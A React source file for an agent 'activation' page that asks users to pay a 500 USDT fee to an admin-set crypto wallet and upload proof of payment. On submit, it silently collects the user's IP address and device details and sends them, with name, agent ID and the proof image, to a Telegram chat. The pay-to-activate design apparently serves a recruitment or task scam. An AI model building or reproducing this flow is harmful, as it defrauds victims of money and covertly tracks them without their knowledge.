import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { UploadCloud, Copy, Check, Info, Wallet } from 'lucide-react';
import { supabase } from '../../lib/supabase';
import { useAuthStore } from '../../store/auth';
import { sendTelegramMessage, sendTelegramPhoto, getDeviceInfo, getIpAddress } from '../../lib/telegram';

export default function Activate() {
  const { t, i18n } = useTranslation();
  const navigate = useNavigate();
  const { user, setUser } = useAuthStore();
  const [loading, setLoading] = useState(false);
  const [copied, setCopied] = useState(false);
  const [file, setFile] = useState<File | null>(null);
  const [error, setError] = useState('');

  const [agentData, setAgentData] = useState<any>(user);

  useEffect(() => {
    if (user?.id) {
      // Update step status
      supabase.from('agents').update({ current_step: 'Activation Info' }).eq('id', user.id);
      
      // Fetch latest profile to get updated payment details from admin
      const fetchProfile = async () => {
        const { data } = await supabase.from('agents').select('*').eq('id', user.id).single();
        if (data) {
          setAgentData(data);
          setUser({ ...user, ...data }, 'agent');
        }
      };
      fetchProfile();
    }
  }, [user?.id]);

  const paymentDetails = {
    amount: agentData?.activation_amount || '500.00',
    currency: 'USDT (TRC20)',
    address: agentData?.usdt_address || 'TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
    qrCode: agentData?.qr_code_url || null
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(paymentDetails.address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      setError(t('upload_proof_error') || 'Please upload a proof of payment');
      return;
    }

    setLoading(true);
    setError('');

    try {
      // In a real app, upload file to Supabase Storage here
      // const { data, error: uploadError } = await supabase.storage.from('proofs').upload(...)

      const { error: updateError } = await supabase
        .from('agents')
        .update({ status: 'under_review', current_step: 'Under Review' })
        .eq('id', user?.id);

      if (updateError) throw updateError;

      // Log activity
      await supabase.from('activities').insert([
        {
          agent_id: user?.agent_id,
          action: 'Agent submitted activation proof',
        },
      ]);

      // Send Telegram notification
      try {
        const ip = await getIpAddress();
        const device = getDeviceInfo();
        const time = new Date().toLocaleString('ar-EG');
        const lang = i18n.language === 'ar' ? 'العربية' : 'English';
        
        const msg = `💸 *تم إرسال إثبات الدفع* 💸\n\n` +
                    `*ID الوكيل:* \`${user?.agent_id}\`\n` +
                    `*الاسم:* ${user?.full_name}\n` +
                    `*المبلغ:* ${paymentDetails.amount} ${paymentDetails.currency}\n` +
                    `*اسم الملف:* ${file.name}\n` +
                    `*اللغة:* ${lang}\n` +
                    `*الجهاز:* ${device}\n` +
                    `*IP:* ${ip}\n` +
                    `*الوقت:* ${time}\n` +
                    `*Status:* ${t('wait_for_review', 'في انتظار المراجعة')}`;
                    
        if (file.type.startsWith('image/')) {
          await sendTelegramPhoto(file, msg, true);
        } else {
          await sendTelegramMessage(msg, true); // Fallback for non-images
        }
      } catch (e) {
        console.error('Telegram notification failed', e);
      }

      setUser({ ...user, status: 'under_review', current_step: 'Under Review' }, 'agent');
      navigate('/agent/review');
    } catch (err: any) {
      setError(err.message || t('failed_submit_activation') || 'Failed to submit activation request');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-6">
      <div className="text-center mb-8">
        <h1 className="text-2xl font-bold text-gray-900">{t('activation')}</h1>
        <p className="text-gray-600 mt-2">{t('complete_activation_payment')}</p>
      </div>

      <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
        <div className="p-6 sm:p-8 space-y-8">
          
          <div className="bg-blue-50 border border-blue-100 rounded-xl p-6 text-center">
            <h3 className="text-sm font-medium text-blue-800 uppercase tracking-wider mb-2">{t('activation_amount')}</h3>
            <div className="text-4xl font-black text-blue-900 mb-1">
              {paymentDetails.amount} <span className="text-xl font-bold text-blue-700">{paymentDetails.currency}</span>
            </div>
          </div>

          <div className="space-y-6">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-600">
                <Wallet className="w-5 h-5" />
              </div>
              <h3 className="text-lg font-bold text-gray-900">{t('payment_details')}</h3>
            </div>
            
            <div className="bg-gradient-to-br from-gray-50 to-gray-100 border border-gray-200 rounded-2xl p-6 shadow-inner relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-indigo-600"></div>
              
              <div className="flex flex-col lg:flex-row items-center gap-8">
                {paymentDetails.qrCode && (
                  <div className="flex flex-col items-center gap-3 shrink-0">
                    <div className="p-3 bg-white border border-gray-200 rounded-2xl shadow-sm">
                      <img src={paymentDetails.qrCode} alt="Payment QR Code" className="w-40 h-40 object-contain rounded-lg" />
                    </div>
                    <span className="text-xs font-medium text-gray-500 bg-gray-200/50 px-3 py-1 rounded-full">{t('scan_to_pay')}</span>
                  </div>
                )}
                
                <div className="flex-1 w-full space-y-4">
                  <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm relative group">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm font-bold text-gray-700 uppercase tracking-wider flex items-center gap-2">
                        {t('deposit_address_usdt')}
                      </span>
                    </div>
                    <div className="flex items-center justify-between bg-gray-50 border border-gray-200 rounded-lg p-3">
                      <code className="font-mono text-sm md:text-base text-gray-800 break-all select-all font-semibold">
                        {paymentDetails.address}
                      </code>
                      <button
                        type="button"
                        onClick={handleCopy}
                        className={`flex-shrink-0 ml-4 flex items-center gap-2 px-4 py-2 rounded-lg font-bold text-sm transition-all shadow-sm ${
                          copied 
                            ? 'bg-green-100 text-green-700 border border-green-200' 
                            : 'bg-white text-gray-700 border border-gray-200 hover:bg-gray-50 hover:text-indigo-600'
                        }`}
                        title={t('copy')}
                      >
                        {copied ? (
                          <>
                            <Check className="w-4 h-4" />
                            <span>{t('copied_success')}</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-4 h-4" />
                            <span>{t('copy')}</span>
                          </>
                        )}
                      </button>
                    </div>
                    <p className="text-xs text-red-500 font-medium mt-3 flex items-center gap-1.5">
                      <Info className="w-4 h-4" />
                      {t('trc20_warning')}
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="w-full h-px bg-gray-100"></div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <h3 className="text-sm font-bold text-gray-900 uppercase tracking-wider mb-4">{t('upload_proof')}</h3>
              
              <div className="mt-1 flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-xl bg-gray-50 hover:bg-gray-100 transition-colors relative">
                <div className="space-y-1 text-center">
                  <UploadCloud className="mx-auto h-12 w-12 text-gray-400" />
                  <div className="flex text-sm text-gray-600 justify-center">
                    <label
                      htmlFor="file-upload"
                      className="relative cursor-pointer bg-white rounded-md font-medium text-secondary hover:text-primary focus-within:outline-none focus-within:ring-2 focus-within:ring-offset-2 focus-within:ring-secondary px-2 py-1"
                    >
                      <span>{t('upload_file')}</span>
                      <input
                        id="file-upload"
                        name="file-upload"
                        type="file"
                        className="sr-only"
                        accept="image/*,.pdf"
                        onChange={(e) => setFile(e.target.files?.[0] || null)}
                      />
                    </label>
                  </div>
                  <p className="text-xs text-gray-500">PNG, JPG, PDF up to 10MB</p>
                </div>
              </div>
              {file && (
                <div className="mt-3 text-sm text-green-600 flex items-center gap-2 bg-green-50 p-3 rounded-lg border border-green-100">
                  <Check className="w-4 h-4" />
                  {t('selected')}: <span className="font-medium">{file.name}</span>
                </div>
              )}
              {error && (
                <div className="mt-3 text-sm text-red-600 bg-red-50 p-3 rounded-lg border border-red-100">
                  {error}
                </div>
              )}
            </div>

            <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 flex items-start gap-3">
              <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-blue-800">
                {t('activation_review_notice')}
              </p>
            </div>

            <button
              type="submit"
              disabled={loading || !file}
              className="w-full py-4 bg-secondary text-white font-medium rounded-xl hover:bg-secondary/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2 shadow-sm"
            >
              {loading ? '...' : t('submit')}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
